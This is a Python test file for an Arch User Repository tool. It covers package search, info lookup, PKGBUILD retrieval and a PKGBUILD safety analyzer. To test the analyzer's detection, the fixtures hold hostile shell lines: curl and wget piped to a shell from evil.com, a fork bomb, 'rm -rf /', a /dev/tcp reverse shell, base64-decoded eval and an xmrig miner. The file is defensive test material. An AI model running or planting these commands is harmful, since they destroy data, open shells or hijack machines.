# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
Tests for arch_ops_server.aur module.
"""

from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

from arch_ops_server.aur import (
    AUR_RPC_URL,
    _format_package_info,
    analyze_package_metadata_risk,
    analyze_pkgbuild_safety,
    get_aur_file,
    get_aur_info,
    get_pkgbuild,
    search_aur,
)


class TestAURSearch:
    """Test AUR package search functionality."""

    @pytest.mark.asyncio
    async def test_search_aur_success(self, mock_httpx_response, sample_aur_package):
        """Test successful AUR search."""
        mock_response = mock_httpx_response(
            status_code=200,
            json_data={
                "version": 5,
                "type": "search",
                "resultcount": 1,
                "results": [sample_aur_package],
            },
        )

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=mock_response
            )

            result = await search_aur("test-package")

            assert "data" in result
            assert result["data"]["count"] == 1
            assert len(result["data"]["results"]) == 1
            # _format_package_info returns lowercase field names
            assert result["data"]["results"][0]["name"] == "test-package"

    @pytest.mark.asyncio
    async def test_search_aur_no_results(self, mock_httpx_response):
        """Test AUR search with no results."""
        mock_response = mock_httpx_response(
            status_code=200,
            json_data={"version": 5, "type": "search", "resultcount": 0, "results": []},
        )

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=mock_response
            )

            result = await search_aur("nonexistent-package-xyz")

            assert result["data"]["count"] == 0
            assert result["data"]["results"] == []

    @pytest.mark.asyncio
    async def test_search_aur_timeout(self):
        """Test AUR search timeout handling."""
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.TimeoutException("Request timed out")
            )

            result = await search_aur("test")

            assert result["error"] is True
            assert result["type"] == "TimeoutError"

    @pytest.mark.asyncio
    async def test_search_aur_rate_limit(self, mock_httpx_response):
        """Test AUR search rate limit handling."""
        mock_response = mock_httpx_response(status_code=429)

        with patch("httpx.AsyncClient") as mock_client:
            mock_get = AsyncMock(return_value=mock_response)
            mock_get.side_effect = httpx.HTTPStatusError(
                "Too many requests", request=MagicMock(), response=mock_response
            )
            mock_client.return_value.__aenter__.return_value.get = mock_get

            result = await search_aur("test")

            assert result["error"] is True
            assert result["type"] == "RateLimitError"
            # Message might not contain "429", just check it's a rate limit error
            assert "rate limit" in result["message"].lower()


class TestAURPackageInfo:
    """Test AUR package information retrieval."""

    @pytest.mark.asyncio
    async def test_get_aur_info_success(self, mock_httpx_response, sample_aur_package):
        """Test successful package info retrieval."""
        mock_response = mock_httpx_response(
            status_code=200,
            json_data={
                "version": 5,
                "type": "info",
                "resultcount": 1,
                "results": [sample_aur_package],
            },
        )

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=mock_response
            )

            result = await get_aur_info("test-package")

            assert "data" in result
            # _format_package_info returns lowercase field names
            assert result["data"]["name"] == "test-package"
            assert result["data"]["version"] == "1.0.0-1"

    @pytest.mark.asyncio
    async def test_get_aur_info_not_found(self, mock_httpx_response):
        """Test package info for non-existent package."""
        mock_response = mock_httpx_response(
            status_code=200,
            json_data={"version": 5, "type": "info", "resultcount": 0, "results": []},
        )

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=mock_response
            )

            result = await get_aur_info("nonexistent-package")

            assert result["error"] is True
            assert result["type"] == "NotFound"


class TestPKGBUILDRetrieval:
    """Test PKGBUILD file retrieval."""

    @pytest.mark.asyncio
    async def test_get_pkgbuild_success(self, mock_httpx_response, sample_pkgbuild_safe):
        """Test successful PKGBUILD retrieval."""
        mock_response = mock_httpx_response(status_code=200, text_data=sample_pkgbuild_safe)

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=mock_response
            )

            result = await get_pkgbuild("test-package")

            assert "pkgname=test-package" in result
            assert "pkgver=" in result

    @pytest.mark.asyncio
    async def test_get_aur_file_custom_filename(self, mock_httpx_response):
        """Test retrieval of non-PKGBUILD files."""
        mock_response = mock_httpx_response(status_code=200, text_data="install script content")

        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=mock_response
            )

            result = await get_aur_file("test-package", filename="install")

            assert "install script content" in result

    @pytest.mark.asyncio
    async def test_get_pkgbuild_not_found(self, mock_httpx_response):
        """Test PKGBUILD retrieval for non-existent package."""
        mock_response = mock_httpx_response(status_code=404)

        with patch("httpx.AsyncClient") as mock_client:
            mock_get = AsyncMock(return_value=mock_response)
            mock_get.side_effect = httpx.HTTPStatusError(
                "Not found", request=MagicMock(), response=mock_response
            )
            mock_client.return_value.__aenter__.return_value.get = mock_get

            with pytest.raises(
                ValueError, match="PKGBUILD not found|could not be retrieved"
            ):
                await get_pkgbuild("nonexistent-package")


class TestPKGBUILDSafetyAnalysis:
    """Test comprehensive PKGBUILD security analysis."""

    def test_analyze_safe_pkgbuild(self, sample_pkgbuild_safe):
        """Test analysis of a safe PKGBUILD."""
        result = analyze_pkgbuild_safety(sample_pkgbuild_safe)

        assert result["safe"] is True
        assert len(result["red_flags"]) == 0
        assert result["risk_score"] < 30  # Low risk
        assert "SAFE" in result["recommendation"]

    def test_analyze_dangerous_pkgbuild(self, sample_pkgbuild_dangerous):
        """Test analysis of a malicious PKGBUILD."""
        result = analyze_pkgbuild_safety(sample_pkgbuild_dangerous)

        assert result["safe"] is False
        assert len(result["red_flags"]) > 0
        assert result["risk_score"] > 70  # High risk
        assert "DO NOT INSTALL" in result["recommendation"]

    def test_detect_curl_pipe_sh(self):
        """Test detection of 'curl | sh' pattern."""
        pkgbuild = """
build() {
    curl https://evil.com/script.sh | sh
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        assert result["safe"] is False
        # red_flags are dicts with "issue" field
        # Look for "piping curl" or "curl" and "shell" in the message
        assert any("curl" in flag["issue"].lower() and "shell" in flag["issue"].lower() for flag in result["red_flags"])

    def test_detect_wget_pipe_bash(self):
        """Test detection of 'wget | bash' pattern."""
        pkgbuild = """
build() {
    wget -O - https://evil.com/malware.sh | bash
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        assert result["safe"] is False
        assert any("wget" in flag["issue"].lower() for flag in result["red_flags"])

    def test_detect_fork_bomb(self):
        """Test detection of fork bomb pattern."""
        pkgbuild = """
build() {
    :(){ :|:& };:
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        assert result["safe"] is False
        assert any("fork bomb" in flag["issue"].lower() for flag in result["red_flags"])

    def test_detect_rm_rf_root(self):
        """Test detection of 'rm -rf /' pattern."""
        pkgbuild = """
package() {
    rm -rf / 2>/dev/null
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        # rm -rf / is dangerous, should at least have warnings or red flags
        assert len(result["red_flags"]) > 0 or len(result["warnings"]) > 0

    def test_detect_reverse_shell(self):
        """Test detection of reverse shell patterns."""
        pkgbuild = """
build() {
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        assert result["safe"] is False
        assert any("reverse shell" in flag["issue"].lower() or "/dev/tcp" in flag["issue"] for flag in result["red_flags"])

    def test_detect_base64_obfuscation(self):
        """Test detection of base64 obfuscation."""
        pkgbuild = """
build() {
    eval "$(echo Y3VybCBodHRwOi8vZXZpbC5jb20= | base64 -d)"
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        # Base64 with eval should be flagged as at least a warning
        assert len(result["red_flags"]) > 0 or len(result["warnings"]) > 0

    def test_detect_cryptocurrency_mining(self):
        """Test detection of crypto mining patterns."""
        pkgbuild = """
build() {
    wget https://pool.com/xmrig
    ./xmrig --donate-level 1 --pool pool.hashvault.pro:80
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        assert result["safe"] is False
        # Should detect either cryptocurrency mining or suspicious downloads
        assert len(result["red_flags"]) > 0 or len(result["warnings"]) > 0

    def test_detect_suspicious_url_shortener(self):
        """Test detection of URL shorteners in sources."""
        pkgbuild = """
source=("https://bit.ly/malware")
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        # URL shorteners are typically warnings, not red flags
        assert len(result["warnings"]) > 0 or len(result["red_flags"]) > 0

    def test_detect_paste_site_sources(self):
        """Test detection of paste sites in sources."""
        pkgbuild = """
source=("https://pastebin.com/raw/abc123")
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        assert len(result["warnings"]) > 0 or len(result["red_flags"]) > 0

    def test_detect_eval_usage(self):
        """Test detection of eval command."""
        pkgbuild = """
build() {
    eval "$malicious_code"
}
"""
        result = analyze_pkgbuild_safety(pkgbuild)

        # Eval should be flagged as at least a warning
        assert len(result["red_flags"]) > 0 or len(result["warnings"]) > 0

    def test_risk_score_calculation(self):
        """Test risk score increases with more issues."""
        safe_pkgbuild = "pkgname=test\npkgver=1.0\nbuild() { make }"
        dangerous_pkgbuild = """
build() {
    curl https://evil.com/malware.sh | sh
    eval "$(echo bad_code | base64 -d)"
    rm -rf /tmp/*
}
"""

        safe_result = analyze_pkgbuild_safety(safe_pkgbuild)
        dangerous_result = analyze_pkgbuild_safety(dangerous_pkgbuild)

        assert safe_result["risk_score"] < dangerous_result["risk_score"]
        assert dangerous_result["risk_score"] > 50


class TestPackageMetadataRisk:
    """Test package metadata trust scoring."""

    def test_analyze_trusted_package(self, sample_aur_package):
        """Test analysis of a well-maintained package."""
        # High votes, has maintainer, recent update
        result = analyze_package_metadata_risk(sample_aur_package)

        # With moderate votes (42), should have reasonable trust
        assert result["trust_score"] >= 40
        assert len(result["trust_indicators"]) > 0
        # Check recommendation is positive (TRUSTED, MODERATE, or Generally)
        assert any(word in result["recommendation"] for word in ["TRUSTED", "MODERATE", "Generally", "acceptable"])

    def test_analyze_untrusted_package(self):
        """Test analysis of suspicious package."""
        untrusted_pkg = {
            "NumVotes": 0,  # No votes
            "Popularity": 0.0,  # No popularity
            "OutOfDate": 1234567890,  # Flagged out of date
            "Maintainer": None,  # No maintainer (orphaned)
            "FirstSubmitted": 1234567890,  # Old submission
            "LastModified": 1234567890,  # Not updated recently
        }

        result = analyze_package_metadata_risk(untrusted_pkg)

        assert result["trust_score"] < 50
        assert len(result["risk_factors"]) > 0
        # Check that recommendation indicates untrusted/caution
        assert "UNTRUSTED" in result["recommendation"] or "RISKY" in result["recommendation"]

    def test_orphaned_package_risk(self):
        """Test that orphaned packages are flagged."""
        orphaned_pkg = {
            "NumVotes": 10,
            "Popularity": 0.5,
            "OutOfDate": None,
            "Maintainer": None,  # Orphaned
            "FirstSubmitted": 1600000000,
            "LastModified": 1650000000,
        }

        result = analyze_package_metadata_risk(orphaned_pkg)

        # risk_factors are dicts with "issue" field
        assert any("orphan" in factor["issue"].lower() or "maintainer" in factor["issue"].lower() for factor in result["risk_factors"])

    def test_out_of_date_package_risk(self):
        """Test that out-of-date packages are flagged."""
        out_of_date_pkg = {
            "NumVotes": 10,
            "Popularity": 0.5,
            "OutOfDate": 1234567890,  # Flagged
            "Maintainer": "testuser",
            "FirstSubmitted": 1600000000,
            "LastModified": 1650000000,
        }

        result = analyze_package_metadata_risk(out_of_date_pkg)

        # risk_factors are dicts with "issue" field
        assert any("out of date" in factor["issue"].lower() or "out-of-date" in factor["issue"].lower() for factor in result["risk_factors"])

    def test_new_package_warning(self):
        """Test that very new packages get warnings."""
        import time

        new_pkg = {
            "NumVotes": 0,
            "Popularity": 0.0,
            "OutOfDate": None,
            "Maintainer": "newuser",
            "FirstSubmitted": int(time.time()) - 86400,  # 1 day old
            "LastModified": int(time.time()) - 86400,
        }

        result = analyze_package_metadata_risk(new_pkg)

        # New packages should have warnings or lower trust
        assert result["trust_score"] < 70 or len(result["risk_factors"]) > 0


class TestFormatPackageInfo:
    """Test package info formatting."""

    def test_format_package_info_basic(self, sample_aur_package):
        """Test basic package info formatting."""
        result = _format_package_info(sample_aur_package, detailed=False)

        # _format_package_info returns lowercase field names
        assert result["name"] == "test-package"
        assert result["version"] == "1.0.0-1"
        assert "description" in result

    def test_format_package_info_detailed(self, sample_aur_package):
        """Test detailed package info formatting."""
        result = _format_package_info(sample_aur_package, detailed=True)

        # _format_package_info returns lowercase field names
        assert result["name"] == "test-package"
        assert "depends" in result
        assert "makedepends" in result
        assert "votes" in result
